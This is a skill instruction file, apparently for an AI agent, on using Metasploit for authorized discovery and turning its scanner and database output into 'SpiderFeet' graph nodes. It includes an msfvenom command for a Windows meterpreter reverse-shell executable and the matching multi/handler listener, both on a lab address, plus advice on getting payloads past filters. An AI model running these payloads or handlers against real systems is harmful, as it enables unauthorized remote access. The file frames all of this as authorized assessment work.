---
name: metasploit_framework
description: Use for msfconsole, msfvenom, use auxiliary/, search, set RHOSTS, exploit/multi/handler, db_nmap, workspace, resource script, and payload staging in authorized assessments where MSF discovery output must be mapped into SpiderFeet nugget graphs.
---

# Metasploit Framework — Scan, Payloads, and Nuggets

## Purpose

Use when authorized assessment workflows need the [Metasploit Framework](https://github.com/rapid7/metasploit-framework) for **modular discovery** (`auxiliary/scanner/*`, `auxiliary/gather/*`), **workspace-backed host/service/vuln data**, optional **lab payload + `exploit/multi/handler`** validation, or **resource-script automation** whose results must become SpiderFeet nugget graphs.

MSF is a **Ruby modular penetration-testing platform** centred on **`msfconsole`**, with companions **`msfvenom`** (payload generation) and **`msfdb`** (PostgreSQL database / REST web service). Prefer dedicated scanners when MSF module depth is unnecessary:

| Need | Prefer |
|------|--------|
| Mass port inventory | **naabu** / **nmap** |
| HTTP live + tech | **httpx** / **webanalyze** |
| CVE/template vulns | **nuclei** |
| Service fingerprint | **nerva** / **nmap -sV** |
| Modular aux discovery + DB workspaces + handler labs | **Metasploit** |

**Package (this repo):** Nightly Windows tree under `.tools/metasploit/framework/` — **metasploit-framework 6.5.2-20260809060523-1rapid7** (see `.tmp_msf_help/version.txt`).

**Windows runtime note (2026-08-10):** After MSI admin extract, `msfconsole` / `msfvenom` / `msfdb` fail with `Bundler::GemNotFound` (gems not materialized). A full MSI install also failed (**error 1603**). Authoritative CLI flags for this package are **reconstructed OptionParser help** (embedded `ruby.exe` + package sources), not live `-h`. See `.docs/docs-for-cli-tools/Metasploit-Framework-CLI-Options.md`.

## Step-by-Step Instructions

1. **Confirm scope** — Authorized lab/targets only. Exploitation modules are out-of-scope unless explicitly approved; default to auxiliary/discovery.
2. **Install / verify** — Prefer a complete Rapid7 nightly or Kali package so Bundler gems resolve. Check `msfconsole -v` / `msfvenom -h` when runtime works. On this extract-only tree, document GemNotFound and use reconstructed flags for CLI reference.
3. **Initialize DB** — `msfdb init` (optionally `--use-defaults`). Confirm in console with `db_status`. Use `msfconsole -n` only when DB is intentionally disabled.
4. **Workspace** — `workspace -a <name>` then `workspace <name>` (one engagement per workspace).
5. **Search / use** — `search type:auxiliary scanner <proto>` then `use auxiliary/scanner/...` (or gather). Avoid jumping to `exploit/*` for graph-building.
6. **Inspect metadata** — `info` (and `info -d` when docs exist), `show options`, `show advanced`, `show evasion`. Read reliability / side effects / references.
7. **Set datastore** — `set RHOSTS …`, `RPORT`, threads, creds as required. Prefer module-local `set` over broad `setg` unless the script needs globals.
8. **Run** — `run` for auxiliary. Prefer `check` before `exploit` when a check exists and exploit is authorized.
9. **Review DB views** — `hosts`, `services`, `vulns`, `creds`, `loot`, `notes`.
10. **Optional lab callback** — Generate with `msfvenom`, listen with `exploit/multi/handler` matching payload/`LHOST`/`LPORT`; lab-only.
11. **Export + map nuggets** — Prefer `db_export` / DB-backed tables over banner art. Map per `references/nugget-mapping.md`. Use TextFSM only for console text that never lands in structured export.

## If/Then Decision Rules

| If | Then |
|----|------|
| Goal is recon / SpiderFeet graph | Stay in `auxiliary/scanner/*` and `auxiliary/gather/*` |
| Need ports/services at scale | Run **nmap**/`db_nmap` or **naabu** first; import or correlate into MSF |
| Module has `check` | Run `check` before any `exploit` |
| Exploit not explicitly authorized | Do not `exploit`; stop at aux + DB evidence |
| Staged payload fails through filters | Try stageless / alternate transport; re-pair handler |
| Reverse payload | Pair with `exploit/multi/handler` using same payload + LHOST/LPORT |
| DB missing / `db_status` disconnected | `msfdb start` or `msfdb init`; or `-n` and accept no workspace persistence |
| Workspace `hosts` empty after run | Retune `RHOSTS`/module fit; verify reachability outside MSF |
| Pure HTTP CVE hunt | Prefer **nuclei**; use MSF only for module-specific paths |
| Need repeatable corpus run | `msfconsole -q -r script.rc` or `-x "…; …"` with explicit workspace |
| This Windows extract hits GemNotFound | Do not invent workarounds as “success”; log failure scenario; use Kali/WSL or complete install for live runs |
| MSI install returns 1603 | Treat as install blocker; keep OptionParser-reconstructed help as flag truth for the package tree |

## Guardrails & Pitfalls

- **Authorization** — Scanning and payload delivery without written scope is prohibited.
- **Auxiliary-first** — Exploitation, AV evasion, and destructive modules are not default SpiderFeet profiling paths.
- **Read before run** — Always `info` + options/advanced/evasion; check side effects / stability metadata.
- **Do not invent CLI flags** — Use only reconstructed OptionParser captures (or live `-h` after a working install). Console commands (`search`, `hosts`, …) are interactive, not `msfconsole` argv.
- **Payloads are sensitive** — Lab-only generation/handlers; treat AV/EDR alerts as expected noise, not corpus goals.
- **Workspaces** — Segment engagements; do not mix clients in `default`.
- **`setg` leakage** — Globals persist across modules; prefer `set` + explicit unset in scripts.
- **Extract ≠ install** — Admin-extracted nightly without completed MSI gem layout will not boot (`Bundler::GemNotFound`).
- **IP nuggets** — Use `core.ip_classify.classify_ip`; never hardcode `IP_ADDRESS` for IPv6 literals.
- **Structured-first** — Prefer DB export / machine-readable tables for graphs; console TUI is for operators.

## MSFvenom workflows

1. List: `msfvenom -l payloads` / `-l formats` / `-l encoders` (types also include `nops`, `platforms`, `archs`, `encrypt`, `all`).
2. Inspect payload options: `msfvenom -p <payload> --list-options`.
3. Generate with explicit `-p`, `--platform`, `-a`, `-f`, `-o`, plus `LHOST=` / `LPORT=` as `var=val`.
4. Add `-b` badchars / `-e` encoder / `-i` iterations only when required by the exploit constraint.
5. Pair reverse payloads with a matching `exploit/multi/handler` session.

Details: [`references/msfvenom-workflows.md`](references/msfvenom-workflows.md).

## Automation

- Resource file: `msfconsole -q -r script.rc` (`-` = stdin for `-r`).
- One-liner: `msfconsole -q -x "workspace lab; use auxiliary/scanner/...; set RHOSTS ...; run; hosts"`.
- Always select workspace inside the script before `use`/`run`.
- Capture console log with `-o FILE` when DB export is unavailable.

Details: [`references/resource-scripts-and-automation.md`](references/resource-scripts-and-automation.md).

## SpiderFeet nugget mapping

| MSF evidence | Typical nuggets |
|--------------|-----------------|
| `hosts` address / name | `IP_ADDRESS` / `INTERNAL_IP_ADDRESS` (via `classify_ip`), `INTERNET_NAME` |
| `services` port/proto | `TCP_PORT_OPEN` / `UDP_PORT_OPEN`, banners → `TCP_PORT_OPEN_BANNER` |
| OS notes | `OPERATING_SYSTEM` |
| `vulns` / CVE refs | `VULNERABILITY_CVE_*` / `VULNERABILITY_GENERAL` |
| `creds` / `loot` / sessions | Structured sensitive descriptors — handle as controlled evidence |

Build `nodes[]` / `edges[]` (`contains`, `has`, `runs`, `affected_by`) from exports. Full mapping: [`references/nugget-mapping.md`](references/nugget-mapping.md).

## References

Indexed in [`references/SKILLS.md`](references/SKILLS.md).

| File | Topic |
|------|--------|
| `cli-options.md` | Package CLI flags summary + pointer to full capture doc |
| `msfconsole-commands.md` | Interactive console command families |
| `module-types-and-datastore.md` | Module classes, datastore, check vs exploit |
| `msfvenom-workflows.md` | Payload generation and handler pairing |
| `msfdb-workspaces-and-db-exports.md` | msfdb lifecycle, workspaces, exports |
| `auxiliary-scanner-workflows.md` | Discovery-first pipelines |
| `resource-scripts-and-automation.md` | `-r`, `-x`, repeatable scripts |
| `sessions-and-handler-patterns.md` | `multi/handler` and sessions |
| `development-metadata-and-stability.md` | Reliability / side effects / docs |
| `nugget-mapping.md` | DB/console → SpiderFeet graph |
| `tactics.md` | Search heuristics, empty workspace, tool handoffs |
| `sources.md` | Canonical URLs |

Operator guides: `.docs/docs-for-cli-tools/Metasploit-Framework-Zero-to-Hero.md`, `Metasploit-Framework-CLI-Options.md`.

## Comprehensive Examples

### VERIFY / VERSION (when runtime works)

```bash
msfconsole -v
msfvenom -h
msfdb --help
msfdb status
```

### DB + WORKSPACE

```bash
msfdb init --use-defaults
msfconsole -q -x "db_status; workspace -a lab1; workspace lab1; workspace"
```

### AUXILIARY SCANNER

```text
msf6 > workspace lab1
msf6 > search type:auxiliary scanner smb
msf6 > use auxiliary/scanner/smb/smb_version
msf6 > info
msf6 > show options
msf6 > set RHOSTS 192.168.56.0/24
msf6 > run
msf6 > hosts
msf6 > services
```

### AUTOMATION (`-r` / `-x`)

```bash
msfconsole -q -r discover.rc
msfconsole -q -x "workspace lab1; use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.56.10; run; services"
```

Example `discover.rc`:

```text
workspace lab1
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.56.0/24
run
hosts
services
```

### MSFVENOM + HANDLER (lab)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o /tmp/lab_payload.exe
```

```text
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.1
msf6 > set LPORT 4444
msf6 > run -j
msf6 > sessions -l
```

### DB NMAP IMPORT / EXPORT

```text
msf6 > db_nmap -sV -T4 192.168.56.10
msf6 > hosts
msf6 > services
msf6 > db_export -f xml /tmp/lab1_export.xml
```

### WINDOWS EXTRACT FAILURE (documented)

```text
Bundler::GemNotFound: Could not find simplecov-0.18.2, ... in locally installed gems
```

See CLI-Options “Captured failure” for full context.

## Strategies and Tactics

See [`references/tactics.md`](references/tactics.md). Summary:

1. **Discover → enumerate → validate → document** — auxiliary scanners first; exploits only when authorized.
2. **Search with filters** — `type:`, `platform:`, `name:`, CVE strings; prefer modules with recent docs under `documentation/modules/**`.
3. **Pair with dedicated scanners** — nmap/naabu/httpx/nuclei for breadth; MSF for module-specific depth and workspace correlation.
4. **`db_nmap` vs native nmap** — import when you need MSF DB/vuln correlation; keep raw `-oX` for SpiderFeet nmap adapters when profiling nmap itself.
5. **Empty workspace** — treat as suspect options/module/target until proven clean miss.
6. **Handler discipline** — payload name, LHOST, LPORT, and exit must match; lab VMs only.
